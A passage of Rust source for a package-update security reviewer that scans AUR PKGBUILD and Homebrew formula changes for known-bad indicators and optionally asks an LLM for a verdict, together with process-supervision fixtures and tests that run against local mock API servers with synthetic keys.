        if let Some((ready, resume)) = start_gate
            .after_release_checkpoint
            .lock()
            .map_err(|_| "fixture checkpoint unavailable")?
            .take()
        {
            ready
                .send(())
                .map_err(|_| "fixture checkpoint unavailable")?;
            resume
                .recv_timeout(Duration::from_secs(10))
                .map_err(|_| "fixture checkpoint unavailable")?;
        }
        Ok(supervised)
    }

    fn reject_after_admission(&mut self, reason: &'static str) -> &'static str {
        let cancellation = self.attempt.cancel();
        self.reaped = stop_fixture_direct_child(&mut self.child);
        let _ = self.record_reaped_exit();
        if cancellation.is_err() || !self.reaped {
            return "fixture cleanup unverified";
        }
        // A successful stop request is not proof that the group is empty.
        reason
    }

    /// Only a direct-child wait result is persisted; this says nothing about
    /// cgroup emptiness, descendants, rollback, or recovery authorization.
    fn record_reaped_exit(&mut self) -> Result<(), &'static str> {
        let Some(context) = &self.recovery_exit else {
            return Ok(());
        };
        if !self.reaped {
            return Err("fixture direct-child exit unavailable");
        }
        let status = self
            .child
            .try_wait()
            .map_err(|_| "fixture direct-child exit unavailable")?
            .ok_or("fixture direct-child exit unavailable")?;
        crate::same_user_supervisor::verify_named_recovery_directory(
            &context.path,
            &context.directory,
        )
        .map_err(|_| "fixture recovery unavailable")?;
        crate::recovery_state::persist_direct_exit(
            &context.directory,
            &context.attempt,
            status.success(),
        )
        .map_err(|_| "fixture recovery unavailable")?;
        crate::same_user_supervisor::verify_named_recovery_directory(
            &context.path,
            &context.directory,
        )
        .map_err(|_| "fixture recovery unavailable")
    }

    /// Request cancellation, reap the direct child and observe an empty cgroup
    /// within one deadline. Empty is not proof of ownership or non-repopulation.
    pub fn cancel_and_observe(&mut self, timeout: Duration) -> Result<(), &'static str> {
        let deadline = std::time::Instant::now()
            .checked_add(timeout)
            .ok_or("invalid deadline")?;
        if let Err(error) = self.attempt.cancel() {
            // A failed group signal must not leave the direct child running
            // until this owner is dropped. This remains best effort and does
            // not establish cleanup of descendants.
            self.reaped = stop_fixture_direct_child_until(&mut self.child, deadline);
            let _ = self.record_reaped_exit();
            return Err(error);
        }
        let wait = wait_for_fixture_child_after_cancel(
            &mut self.child,
            &mut self.reaped,
            deadline,
            std::process::Child::try_wait,
        );
        if wait.is_err() {
            if self.reaped {
                let _ = self.record_reaped_exit();
            }
            return wait;
        }
        self.record_reaped_exit()?;
        loop {
            match self.attempt.observe()? {
                crate::codex_supervision::CgroupSequenceState::EmptyAfterPopulated => return Ok(()),
                _ if std::time::Instant::now() < deadline => {
                    std::thread::sleep(Duration::from_millis(10))
                }
                _ => return Err("fixture cgroup cleanup timed out"),
            }
        }
    }
}

#[cfg(all(target_os = "linux", feature = "codex-fixture"))]
impl Drop for FixtureSupervisedChild {
    fn drop(&mut self) {
        // Test-only best effort: request group cancellation before waiting for
        // the direct child. A timeout or error is not cleanup proof.
        if !self.attempt.cancelled {
            let _ = self.attempt.cancel();
        }
        if !self.reaped {
            let _ = self.child.kill();
            let deadline = std::time::Instant::now() + Duration::from_secs(1);
            while std::time::Instant::now() < deadline {
                match self.child.try_wait() {
                    Ok(Some(_)) => {
                        self.reaped = true;
                        break;
                    }
                    Ok(None) => std::thread::sleep(Duration::from_millis(10)),
                    Err(_) => break,
                }
            }
        }
    }
}

impl PendingCodexReview {
    /// Consume the pending result and bind exactly one observer. This records
    /// diagnostics only: it does not establish cgroup ownership or authorize
    /// release of the result.
    #[cfg(target_os = "linux")]
    pub fn bind_cgroup(
        self,
        mut sequence: crate::codex_supervision::CgroupSequence,
    ) -> Result<ObservedCodexReview, &'static str> {
        if sequence.observe()? != crate::codex_supervision::CgroupSequenceState::Populated {
            return Err("cgroup was not observed populated during binding");
        }
        Ok(ObservedCodexReview {
            _pending: self,
            sequence,
        })
    }
}

/// Quarantined result with one bound observer; it cannot be promoted.
///
/// ```compile_fail
/// fn swap(result: &mut tucupi::review::ObservedCodexReview,
///         other: &mut tucupi::codex_supervision::CgroupSequence) {
///     let _ = result.observe_cgroup(other);
/// }
/// ```
#[cfg(target_os = "linux")]
#[must_use]
pub struct ObservedCodexReview {
    _pending: PendingCodexReview,
    sequence: crate::codex_supervision::CgroupSequence,
}

#[cfg(target_os = "linux")]
impl ObservedCodexReview {
    /// Experimental cancellation for the delegated fixture only. The result
    /// stays quarantined; this does not establish unit ownership or cleanup.
    #[cfg(feature = "codex-fixture")]
    pub fn cancel_fixture(&mut self) -> Result<(), &'static str> {
        self.sequence.cancel_fixture()
    }

    /// Observe only the bound directory; empty is not proof of cleanup.
    pub fn observe_cgroup(
        &mut self,
    ) -> Result<crate::codex_supervision::CgroupSequenceState, &'static str> {
        self.sequence.observe()
    }
}

/// Validate a response and quarantine its result. This does not establish
/// isolation or cleanup and does not enable the Codex provider.
pub fn parse_codex_review_response(body: &[u8]) -> Option<PendingCodexReview> {
    if !crate::codex_protocol::validate_response(body) {
        return None;
    }
    let text = std::str::from_utf8(body).ok()?;
    for line in text.lines() {
        let Some(data) = line.strip_prefix("data: ") else {
            continue;
        };
        let Ok(event) = serde_json::from_str::<serde_json::Value>(data) else {
            continue;
        };
        if event.get("type").and_then(serde_json::Value::as_str) != Some("response.completed") {
            continue;
        }
        let output = event.get("response")?.get("output")?.as_array()?;
        let [message] = output.as_slice() else {
            return None;
        };
        let content = message.get("content")?.as_array()?;
        let [part] = content.as_slice() else {
            return None;
        };
        if part.get("type")?.as_str()? != "output_text" {
            return None;
        }
        let answer = part.get("text")?.as_str()?;
        let mut lines = answer.trim().lines();
        let verdict = lines.next()?.trim();
        let reason = lines.next()?.trim();
        if lines.next().is_some()
            || !verdict.starts_with("VERDICT:")
            || !reason.starts_with("REASON:")
        {
            return None;
        }
        let (verdict, reason) = parse_verdict_output(answer)?;
        return Some(PendingCodexReview {
            _verdict: verdict,
            _reason: reason,
        });
    }
    None
}

fn model_command(config: &Config, prompt: &str) -> Option<(String, Vec<String>, Option<String>)> {
    match config.review_provider() {
        // The shared OpenCode service can load tools and plugins. Until an
        // enforceable isolation boundary is verified, do not start it here.
        "opencode" => None,
        "apple" => Some((
            "/usr/bin/fm".into(),
            vec![
                "respond".into(),
                "--model".into(),
                "system".into(),
                "--no-stream".into(),
            ],
            Some(prompt.into()),
        )),
        // CLI tool restrictions do not establish a verified OS boundary.
        "claude" => None,
        // The recovery preflight is diagnostic only; it cannot enable Codex.
        "codex" => None,
        _ => None,
    }
}

fn unavailable_review_reason(config: &Config) -> &'static str {
    match config.review_provider() {
        "openrouter" | "openai" | "anthropic" | "deepseek" | "zai" | "kimi" => {
            "API review unavailable or invalid — treat as unreviewed"
        }
        "codex" => match config.security.codex_auth_mode {
            None => "Codex authentication mode missing — treat as unreviewed",
            Some(crate::config::CodexAuthMode::Invalid) => {
                "Codex authentication mode invalid — treat as unreviewed"
            }
            Some(crate::config::CodexAuthMode::Chatgpt | crate::config::CodexAuthMode::ApiKey) => {
                "provider isolation not verified — treat as unreviewed"
            }
        },
        "opencode" | "claude" | "agy" | "grok" | "grok-build" => {
            "provider isolation not verified — treat as unreviewed"
        }
        _ => "LLM output unparsable — treat as unreviewed",
    }
}

async fn run_model_command(
    program: &str,
    args: &[String],
    input: Option<&str>,
) -> Result<std::process::Output, String> {
    const MAX_MODEL_OUTPUT_BYTES: u64 = 64_000;
    let mut command = Command::new(program);
    command
        .args(args)
        // Do not expose ambient credentials, agent sockets, or proxy settings
        // to model processes. This is not a filesystem or network sandbox.
        .env_clear()
        .env("PATH", "/usr/bin:/bin")
        .stdin(if input.is_some() {
            Stdio::piped()
        } else {
            Stdio::null()
        })
        .stdout(Stdio::piped())
        .stderr(Stdio::null())
        .kill_on_drop(true);
    let mut attempts = 0;
    let mut child = loop {
        match command.spawn() {
            Ok(child) => break child,
            Err(error) => {
                // ETXTBSY means exec did not start, so no model request ran.
                if cfg!(target_os = "linux") && error.raw_os_error() == Some(26) && attempts < 5 {
                    attempts += 1;
                    tokio::time::sleep(Duration::from_millis(20)).await;
                    continue;
                }
                return Err(format!("spawn: {error}"));
            }
        }
    };
    let stdin = child.stdin.take();
    let stdout = child
        .stdout
        .take()
        .ok_or_else(|| "stdout unavailable".to_string())?;
    let operation = async move {
        let write_input = async {
            if let Some(input) = input {
                let mut stdin = stdin.ok_or_else(|| "stdin unavailable".to_string())?;
                stdin
                    .write_all(input.as_bytes())
                    .await
                    .map_err(|error| format!("stdin write: {error}"))?;
            }
            Ok::<(), String>(())
        };
        let read_output = async {
            let mut output = Vec::new();
            stdout
                .take(MAX_MODEL_OUTPUT_BYTES + 1)
                .read_to_end(&mut output)
                .await
                .map_err(|error| format!("stdout read: {error}"))?;
            if output.len() as u64 > MAX_MODEL_OUTPUT_BYTES {
                return Err("model output exceeded limit".to_string());
            }
            Ok::<Vec<u8>, String>(output)
        };
        let wait = async { child.wait().await.map_err(|error| format!("wait: {error}")) };
        let (_, stdout, status) = tokio::try_join!(write_input, read_output, wait)?;
        if status.success() {
            Ok(std::process::Output {
                status,
                stdout,
                stderr: Vec::new(),
            })
        } else {
            Err(format!("process exited with {status}"))
        }
    };
    tokio::time::timeout(Duration::from_secs(120), operation)
        .await
        .map_err(|_| "process timed out".to_string())?
}

fn verdict_from_deterministic_only(
    report_hits: &[KnownBadHit],
    has_residual: bool,
) -> ReviewVerdict {
    if report_hits
        .iter()
        .any(|hit| hit.severity == HitSeverity::KnownIoc)
    {
        ReviewVerdict::Block
    } else if has_residual || !report_hits.is_empty() {
        ReviewVerdict::Review
    } else {
        ReviewVerdict::Safe
    }
}

/// Review the package source of an AUR or Homebrew dependency before upgrade.
pub async fn review_package(dep: &Dependency, config: &Config) -> ReviewReport {
    review_package_with_control(dep, config, &FixtureStartGate::default()).await
}

pub(crate) async fn review_package_with_control(
    dep: &Dependency,
    config: &Config,
    control: &FixtureStartGate,
) -> ReviewReport {
    if control.is_cancelled() {
        return ReviewReport::unavailable("source review cancelled");
    }
    if !needs_review(dep) {
        return ReviewReport::unavailable("source review not applicable to this ecosystem");
    }

    let cache_key = review_cache_key(dep, config);
    if crate::secrets::ReviewApiProvider::from_config(config.review_provider()).is_none() {
        if let Some(cached) = read_cache::<ReviewReport>(
            "pkgreview",
            &cache_key,
            Duration::from_secs(REVIEW_CACHE_TTL_SECS),
        ) {
            return accept_cached_review(cached, config, control);
        }
    }

    let report = match dep.ecosystem {
        Ecosystem::Pacman => review_pkgbuild(dep, config, control).await,
        Ecosystem::Homebrew => review_formula(dep, config, control).await,
        _ => ReviewReport::unavailable("source review not applicable to this ecosystem"),
    };

    if control.is_cancelled() {
        return ReviewReport::unavailable("source review cancelled");
    }
    let report = enforce_provider_availability(report, config);
    if crate::secrets::ReviewApiProvider::from_config(config.review_provider()).is_none() {
        let _ = write_cache("pkgreview", &cache_key, &report);
    }
    report
}

fn accept_cached_review(
    cached: ReviewReport,
    config: &Config,
    control: &FixtureStartGate,
) -> ReviewReport {
    // The cache read is synchronous; cancellation may have been requested
    // after the initial checkpoint and while that read was in progress.
    if control.is_cancelled() {
        return ReviewReport::unavailable("source review cancelled");
    }
    enforce_provider_availability(cached, config)
}

pub(crate) fn review_cache_key(dep: &Dependency, config: &Config) -> String {
    format!(
        "review-v4-isolation:{}:{}:{}:{}:{}:{}:{}:{:?}",
        dep.ecosystem.as_str(),
        dep.name,
        dep.current_version,
        dep.latest_version,
        config.review_provider(),
        config
            .security
            .review_model
            .as_deref()
            .unwrap_or("<provider-default>"),
        config.review_llm(),
        config.security.codex_auth_mode
    )
}

pub(crate) fn enforce_provider_availability(
    mut report: ReviewReport,
    config: &Config,
) -> ReviewReport {
    // Only a fresh, locally established deterministic origin bypasses the
    // unavailable provider. Model text and deserialized cache entries cannot.
    if model_command(config, "").is_none()
        && report.verdict == ReviewVerdict::Safe
        && report.origin != ReviewOrigin::DeterministicClean
        && report.origin != ReviewOrigin::DirectApi
    {
        report.verdict = ReviewVerdict::Review;
        report.reason = unavailable_review_reason(config).into();
    }
    if model_command(config, "").is_none()
        && report.verdict == ReviewVerdict::Review
        && report.reason == "LLM output unparsable — treat as unreviewed"
    {
        report.reason = unavailable_review_reason(config).into();
    }
    report
}

async fn review_pkgbuild(
    dep: &Dependency,
    config: &Config,
    control: &FixtureStartGate,
) -> ReviewReport {
    let sources = match fetch_pkgbuild_sources(dep).await {
        Ok(sources) => sources,
        Err(error) => return ReviewReport::unavailable(&error.to_string()),
    };
    review_pkgbuild_with_sources(dep, config, control, sources).await
}

async fn review_pkgbuild_with_sources(
    dep: &Dependency,
    config: &Config,
    control: &FixtureStartGate,
    sources: PkgbuildSources,
) -> ReviewReport {
    review_pkgbuild_with_runner(dep, config, control, sources, |payload| async move {
        llm_verdict(config, &payload).await
    })
    .await
}

async fn review_pkgbuild_with_runner<F, Fut>(
    dep: &Dependency,
    config: &Config,
    control: &FixtureStartGate,
    sources: PkgbuildSources,
    run: F,
) -> ReviewReport
where
    F: FnOnce(String) -> Fut,
    Fut: std::future::Future<Output = Option<(ReviewVerdict, String)>>,
{
    let residual = match &sources.baseline {
        Some(baseline) => {
            let diff = compute_residual(
                baseline,
                &sources.current,
                &dep.current_version,
                &dep.latest_version,
                true,
            );
            if diff.trim().is_empty() {
                (ReviewViewMode::Diff, String::new())
            } else {
                (ReviewViewMode::Diff, diff)
            }
        }
        None => {
            let full = sources.current.clone();
            (ReviewViewMode::Full, full)
        }
    };

    let (view_mode, diff_text) = residual;
    let mut hits = scan_known_bad(&diff_text);
    if !sources.install_files.is_empty() {
        hits.extend(scan_known_bad(&sources.install_files));
    }

    if hits.iter().any(|hit| hit.severity == HitSeverity::KnownIoc) {
        return ReviewReport {
            verdict: ReviewVerdict::Block,
            reason: "known Atomic Arch IoC found in package source".to_string(),
            view_mode,
            residual_line_count: count_residual_lines(&diff_text),
            hits,
            origin: ReviewOrigin::Unknown,
        };
    }

    if diff_text.trim().is_empty() && sources.install_files.is_empty() {
        return ReviewReport {
            verdict: ReviewVerdict::Safe,
            reason: "version bump only, no code changes".to_string(),
            view_mode,
            residual_line_count: 0,
            hits,
            origin: ReviewOrigin::DeterministicClean,
        };
    }

    if !config.review_llm() {
        let verdict = verdict_from_deterministic_only(&hits, !diff_text.trim().is_empty());
        return ReviewReport {
            verdict,
            reason: "deterministic scan only (LLM review disabled)".to_string(),
            view_mode,
            residual_line_count: count_residual_lines(&diff_text),
            hits,
            origin: ReviewOrigin::Unknown,
        };
    }

    let payload = format!(
        "package: {} (AUR)  installed={}  new={}
deterministic hits: {}{}",
        dep.name,
        dep.current_version,
        dep.latest_version,
        format_hits(&hits),
        if sources.install_files.is_empty() {
            format!("\n--- {view_mode:?} view ---\n{diff_text}")
        } else {
            format!(
                "\n--- install scripts ---\n{}--- {view_mode:?} view ---\n{diff_text}",
                sources.install_files
            )
        }
    );

    if control.is_cancelled() {
        return ReviewReport::unavailable("source review cancelled");
    }
    match run(payload).await {
        Some((verdict, reason)) => ReviewReport {
            verdict,
            reason,
            view_mode,
            residual_line_count: count_residual_lines(&diff_text),
            hits,
            origin: direct_api_origin(config),
        },
        None => ReviewReport {
            verdict: ReviewVerdict::Review,
            reason: unavailable_review_reason(config).to_string(),
            view_mode,
            residual_line_count: count_residual_lines(&diff_text),
            hits,
            origin: ReviewOrigin::Unknown,
        },
    }
}

async fn review_formula(
    dep: &Dependency,
    config: &Config,
    control: &FixtureStartGate,
) -> ReviewReport {
    let sources = match fetch_formula_sources(dep).await {
        Ok(sources) => sources,
        Err(error) => return ReviewReport::unavailable(&error.to_string()),
    };
    review_formula_with_sources(dep, config, control, sources).await
}

async fn review_formula_with_sources(
    dep: &Dependency,
    config: &Config,
    control: &FixtureStartGate,
    sources: FormulaSources,
) -> ReviewReport {
    let (view_mode, diff_text) = match &sources.baseline {
        Some(baseline) => {
            let diff = compute_residual(
                baseline,
                &sources.current,
                &dep.current_version,
                &dep.latest_version,
                false,
            );
            if diff.trim().is_empty() {
                (ReviewViewMode::Diff, String::new())
            } else {
                (ReviewViewMode::Diff, diff)
            }
        }
        None => (ReviewViewMode::Full, sources.current.clone()),
    };

    let hits = scan_known_bad(&diff_text);
    let is_third_party = sources.tap != "homebrew/core" && sources.tap != "homebrew/cask";

    if hits.iter().any(|hit| hit.severity == HitSeverity::KnownIoc) {
        return ReviewReport {
            verdict: ReviewVerdict::Block,
            reason: "known Atomic Arch IoC found in package source".to_string(),
            view_mode,
            residual_line_count: count_residual_lines(&diff_text),
            hits,
            origin: ReviewOrigin::Unknown,
        };
    }

    if diff_text.trim().is_empty() {
        return ReviewReport {
            verdict: ReviewVerdict::Safe,
            reason: "version bump only, no code changes".to_string(),
            view_mode,
            residual_line_count: 0,
            hits,
            origin: ReviewOrigin::DeterministicClean,
        };
    }

    if !config.review_llm() {
        let verdict = verdict_from_deterministic_only(&hits, true);
        return ReviewReport {
            verdict,
            reason: "deterministic scan only (LLM review disabled)".to_string(),
            view_mode,
            residual_line_count: count_residual_lines(&diff_text),
            hits,
            origin: ReviewOrigin::Unknown,
        };
    }

    let payload = format!(
        "package: {} ({})  installed={}  new={}
source: {} ({})
deterministic hits: {}
--- {:?} view ({} lines) ---
{}",
        dep.name,
        sources.tap,
        dep.current_version,
        dep.latest_version,
        if is_third_party {
            "THIRD-PARTY tap"
        } else {
            "official"
        },
        sources.path,
        format_hits(&hits),
        view_mode,
        count_residual_lines(&diff_text),
        diff_text
    );

    if control.is_cancelled() {
        return ReviewReport::unavailable("source review cancelled");
    }
    match llm_verdict(config, &payload).await {
        Some((verdict, reason)) => ReviewReport {
            verdict,
            reason,
            view_mode,
            residual_line_count: count_residual_lines(&diff_text),
            hits,
            origin: direct_api_origin(config),
        },
        None => ReviewReport {
            verdict: ReviewVerdict::Review,
            reason: unavailable_review_reason(config).to_string(),
            view_mode,
            residual_line_count: count_residual_lines(&diff_text),
            hits,
            origin: ReviewOrigin::Unknown,
        },
    }
}

fn format_hits(hits: &[KnownBadHit]) -> String {
    if hits.is_empty() {
        return "none".to_string();
    }
    hits.iter()
        .map(|hit| format!("line {}: [{}] {}", hit.line_number, hit.pattern, hit.line))
        .collect::<Vec<_>>()
        .join("; ")
}

#[cfg(test)]
mod tests {
    use super::*;

    #[cfg(target_os = "linux")]
    #[tokio::test]
    #[ignore = "requires an isolated Linux keyutils session; use keyctl session"]
    async fn isolated_keyring_restart_source_review() {
        use crate::app::{App, Modal, ReviewSettingsInput};
        use crate::secrets::{KeyringSecretStore, ReviewApiProvider, SecretStore};
        use std::io::{Read, Write};

        if let Ok(service) = std::env::var("TUCUPI_REVIEW_TEST_CHILD") {
            let provider = ReviewApiProvider::from_config(
                &std::env::var("TUCUPI_REVIEW_TEST_PROVIDER").unwrap(),
            )
            .unwrap();
            let port: u16 = std::env::var("TUCUPI_REVIEW_TEST_PORT")
                .unwrap()
                .parse()
                .unwrap();
            let expected: u16 = std::env::var("TUCUPI_REVIEW_TEST_STATUS")
                .unwrap()
                .parse()
                .unwrap();
            let selection = KeyringSecretStore::fixture(&service, "selection");
            let mut app = App::new(std::path::PathBuf::from("."), false);
            app.restore_review_settings_with_store(&selection);
            assert_eq!(app.config.review_provider(), provider.id());
            assert_eq!(
                app.config.security.review_model.as_deref(),
                Some("synthetic-model")
            );
            let dep = Dependency {
                name: "synthetic".into(),
                current_version: "1".into(),
                latest_version: "2".into(),
                ecosystem: Ecosystem::Pacman,
                is_global: false,
                origin: Some(PackageOrigin::Aur),
            };
            let sources = PkgbuildSources {
                baseline: Some("pkgver=1\npackage() { echo before; }\n".into()),
                current: "pkgver=2\npackage() { echo after; }\n".into(),
                install_files: String::new(),
            };
            let report = LOCAL_API_FIXTURE
                .scope(
                    (service, format!("http://127.0.0.1:{port}/review")),
                    async {
                        review_pkgbuild_with_sources(
                            &dep,
                            &app.config,
                            &FixtureStartGate::default(),
                            sources,
                        )
                        .await
                    },
                )
                .await;
            let report = enforce_provider_availability(report, &app.config);
            assert_eq!(
                report.verdict,
                if expected == 200 {
                    ReviewVerdict::Safe
                } else {
                    ReviewVerdict::Review
                }
            );
            return;
        }

        struct FixtureCleanup {
            service: String,
        }
        impl Drop for FixtureCleanup {
            fn drop(&mut self) {
                let selection = KeyringSecretStore::fixture(&self.service, "selection");
                let _ = selection.delete_secret();
                for provider in ReviewApiProvider::ALL {
                    let store =
                        KeyringSecretStore::fixture(&self.service, provider.keychain_account());
                    let _ = store.delete_secret();
                }
            }
        }
        let directory = tempfile::tempdir().unwrap();
        let service = format!(
            "tucupi-e2e-{}",
            directory.path().file_name().unwrap().to_string_lossy()
        );
        let _cleanup = FixtureCleanup {
            service: service.clone(),
        };
        let selection = KeyringSecretStore::fixture(&service, "selection");
        for provider in ReviewApiProvider::ALL {
            let key = KeyringSecretStore::fixture(&service, provider.keychain_account());
            let mut app = App::new(directory.path().to_path_buf(), false);
            app.modal = Modal::ReviewSettings {
                provider,
                model: "synthetic-model".into(),
                input: ReviewSettingsInput::Key("synthetic-key".into()),
            };
            app.review_settings_submit_with_store(&key, &selection);
            app.review_settings_submit_with_store(&key, &selection);
            drop(app);
            for status in [200, 401, 500] {
                let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
                let address = listener.local_addr().unwrap();
                listener.set_nonblocking(true).unwrap();
                let server = std::thread::spawn(move || {
                    let deadline = std::time::Instant::now() + Duration::from_secs(10);
                    let (mut stream, _) = loop {
                        match listener.accept() {
                            Ok(socket) => break socket,
                            Err(error)
                                if error.kind() == std::io::ErrorKind::WouldBlock
                                    && std::time::Instant::now() < deadline =>
                            {
                                std::thread::sleep(Duration::from_millis(10))
                            }
                            Err(error) => panic!("fixture accept: {error}"),
                        }
                    };
                    stream
                        .set_read_timeout(Some(Duration::from_secs(5)))
                        .unwrap();
                    let mut buffer = [0; 8192];
                    let n = stream.read(&mut buffer).unwrap();
                    assert!(String::from_utf8_lossy(&buffer[..n]).contains("synthetic-key"));
                    let answer = "VERDICT: safe\nREASON: synthetic";
                    let body = match provider {
                        ReviewApiProvider::OpenAi => serde_json::json!({"status":"completed","output":[{"type":"message","role":"assistant","status":"completed","content":[{"type":"output_text","text":answer}]}]}),
                        ReviewApiProvider::Anthropic => serde_json::json!({"stop_reason":"end_turn","content":[{"type":"text","text":answer}]}),
                        _ => serde_json::json!({"choices":[{"finish_reason":"stop","message":{"role":"assistant","content":answer}}]}),
                    }.to_string();
                    write!(stream, "HTTP/1.1 {status} Fixture\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}", body.len(), body).unwrap();
                });
                let child = std::process::Command::new(std::env::current_exe().unwrap())
                    .args([
                        "--exact",
                        "review::tests::isolated_keyring_restart_source_review",
                        "--ignored",
                    ])
                    .env("TUCUPI_REVIEW_TEST_CHILD", &service)
                    .env("TUCUPI_REVIEW_TEST_PROVIDER", provider.id())
                    .env("TUCUPI_REVIEW_TEST_PORT", address.port().to_string())
                    .env("TUCUPI_REVIEW_TEST_STATUS", status.to_string())
                    .status()
                    .unwrap();
                server.join().unwrap();
                assert!(child.success());
            }
            key.delete_secret().unwrap();
            assert!(key.get_secret().unwrap().is_none());
        }
        selection.delete_secret().unwrap();
        assert!(selection.get_secret().unwrap().is_none());
    }

    #[tokio::test]
    async fn tui_to_pkgbuild_review_handles_local_api_failures() {
        use crate::app::{App, Modal, ReviewSettingsInput};
        use crate::secrets::{MemorySecretStore, ReviewApiProvider};
        use std::io::{Read, Write};
        for provider in ReviewApiProvider::ALL {
            let selection = MemorySecretStore::default();
            let key = MemorySecretStore::default();
            let mut app = App::new(std::path::PathBuf::from("."), false);
            app.modal = Modal::ReviewSettings {
                provider,
                model: "synthetic-model".into(),
                input: ReviewSettingsInput::Key("synthetic-key".into()),
            };
            app.review_settings_submit_with_store(&key, &selection);
            app.review_settings_submit_with_store(&key, &selection);
            let mut restarted = App::new(std::path::PathBuf::from("."), false);
            restarted.restore_review_settings_with_store(&selection);
            let dep = Dependency {
                name: "synthetic".into(),
                current_version: "1".into(),
                latest_version: "2".into(),
                ecosystem: Ecosystem::Pacman,
                is_global: false,
                origin: Some(PackageOrigin::Aur),
            };
            for status in [200, 401, 500] {
                let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
                let address = listener.local_addr().unwrap();
                let server = std::thread::spawn(move || {
                    let (mut stream, _) = listener.accept().unwrap();
                    stream
                        .set_read_timeout(Some(Duration::from_secs(5)))
                        .unwrap();
                    let mut buffer = [0; 8192];
                    assert!(stream.read(&mut buffer).unwrap() > 0);
                    let answer = "VERDICT: safe\nREASON: synthetic";
                    let body = match provider {
                        ReviewApiProvider::OpenAi => serde_json::json!({"status":"completed","output":[{"type":"message","role":"assistant","status":"completed","content":[{"type":"output_text","text":answer}]}]}),
                        ReviewApiProvider::Anthropic => serde_json::json!({"stop_reason":"end_turn","content":[{"type":"text","text":answer}]}),
                        _ => serde_json::json!({"choices":[{"finish_reason":"stop","message":{"role":"assistant","content":answer}}]}),
                    }.to_string();
                    write!(stream, "HTTP/1.1 {status} Fixture\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}", body.len(), body).unwrap();
                });
                let sources = PkgbuildSources {
                    baseline: Some("pkgver=1\npackage() { echo before; }\n".into()),
                    current: "pkgver=2\npackage() { echo after; }\n".into(),
                    install_files: String::new(),
                };
                let config = &restarted.config;
                let key = &key;
                let report = review_pkgbuild_with_runner(
                    &dep,
                    config,
                    &FixtureStartGate::default(),
                    sources,
                    |payload| async move {
                        llm_api_with(
                            config,
                            &payload,
                            key,
                            |provider, model, prompt, key| async move {
                                let client = reqwest::Client::builder().no_proxy().build().unwrap();
                                crate::review_api::request_with_client(
                                    &client,
                                    &format!("http://{address}/review"),
                                    provider,
                                    &model,
                                    &prompt,
                                    &key,
                                )
                                .await
                            },
                        )
                        .await
                    },
                )
                .await;
                let report = enforce_provider_availability(report, config);
                assert_eq!(
                    report.verdict,
                    if status == 200 {
                        ReviewVerdict::Safe
                    } else {
                        ReviewVerdict::Review
                    }
                );
                server.join().unwrap();
            }
        }
    }

    #[tokio::test]
    async fn direct_review_uses_saved_key_and_local_provider_response() {
        use crate::secrets::{MemorySecretStore, ReviewApiProvider, SecretStore};
        use std::io::{Read, Write};

        for provider in ReviewApiProvider::ALL {
            let store = MemorySecretStore::default();
            store.set_secret("synthetic-key").unwrap();
            let mut config = Config::default();
            config.security.review_provider = Some(provider.id().into());
            config.security.review_model = Some("synthetic-model".into());
            let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
            let address = listener.local_addr().unwrap();
            let server = std::thread::spawn(move || {
                let (mut stream, _) = listener.accept().unwrap();
                stream
                    .set_read_timeout(Some(Duration::from_secs(5)))
                    .unwrap();
                let mut request = Vec::new();
                let mut chunk = [0; 4096];
                loop {
                    let count = stream.read(&mut chunk).unwrap();
                    assert!(count > 0);
                    request.extend_from_slice(&chunk[..count]);
                    if let Some(end) = request.windows(4).position(|v| v == b"\r\n\r\n") {
                        let headers = String::from_utf8_lossy(&request[..end]);
                        let length = headers
                            .lines()
                            .find_map(|line| {
                                let (name, value) = line.split_once(':')?;
                                if name.eq_ignore_ascii_case("content-length") {
                                    value.trim().parse::<usize>().ok()
                                } else {
                                    None
                                }
                            })
                            .unwrap();
                        if request.len() >= end + 4 + length {
                            break;
                        }
                    }
                }
                let answer = "VERDICT: review\nREASON: synthetic finding";
                let body = match provider {
                    ReviewApiProvider::OpenAi => serde_json::json!({"status":"completed","output":[{"type":"message","role":"assistant","status":"completed","content":[{"type":"output_text","text":answer}]}]}),
                    ReviewApiProvider::Anthropic => serde_json::json!({"stop_reason":"end_turn","content":[{"type":"text","text":answer}]}),
                    _ => serde_json::json!({"choices":[{"finish_reason":"stop","message":{"role":"assistant","content":answer}}]}),
                }.to_string();
                write!(stream, "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}", body.len(), body).unwrap();
                request
            });
            let result = llm_api_with(
                &config,
                "synthetic package source",
                &store,
                |provider, model, prompt, key| async move {
                    let client = reqwest::Client::builder().no_proxy().build().unwrap();
                    crate::review_api::request_with_client(
                        &client,
                        &format!("http://{address}/review"),
                        provider,
                        &model,
                        &prompt,
                        &key,
                    )
                    .await
                },
            )
            .await;
            assert_eq!(
                result,
                Some((ReviewVerdict::Review, "synthetic finding".into()))
            );
            let request = String::from_utf8(server.join().unwrap()).unwrap();
            assert!(request.contains("synthetic package source"));
            assert!(request.contains("synthetic-model"));
            assert!(!request.contains("\"tools\""));
            store.delete_secret().unwrap();
            let result = llm_api_with(&config, "synthetic source", &store, |_, _, _, _| async {
                panic!("missing key must not dispatch")
            })
            .await;
            assert_eq!(result, None);
        }
    }

    #[test]
    fn direct_api_verdict_requires_exact_complete_answer() {
        assert_eq!(
            parse_direct_api_verdict("VERDICT: safe\nREASON: harmless"),
            Some((ReviewVerdict::Safe, "harmless".into()))
        );
        assert!(parse_direct_api_verdict("extra\nVERDICT: safe\nREASON: harmless").is_none());
        assert!(parse_direct_api_verdict("VERDICT: safe\nREASON: harmless\nextra").is_none());
        assert!(parse_direct_api_verdict("VERDICT: safe\nREASON: ").is_none());
        assert!(parse_direct_api_verdict("VERDICT: safe\nREASON: bad\u{1b}terminal").is_none());
    }

    #[test]
    fn direct_api_origin_is_not_restored_from_cache() {
        let mut config = Config::default();
        config.security.review_provider = Some("openai".into());
        let report = ReviewReport {
            verdict: ReviewVerdict::Safe,
            reason: "synthetic".into(),
            view_mode: ReviewViewMode::Diff,
            residual_line_count: 1,
            hits: Vec::new(),
            origin: ReviewOrigin::DirectApi,
        };
        assert_eq!(
            enforce_provider_availability(report.clone(), &config).verdict,
            ReviewVerdict::Safe
        );
        let cached: ReviewReport =
            serde_json::from_str(&serde_json::to_string(&report).unwrap()).unwrap();
        assert_eq!(
            enforce_provider_availability(cached, &config).verdict,
            ReviewVerdict::Review
        );
    }

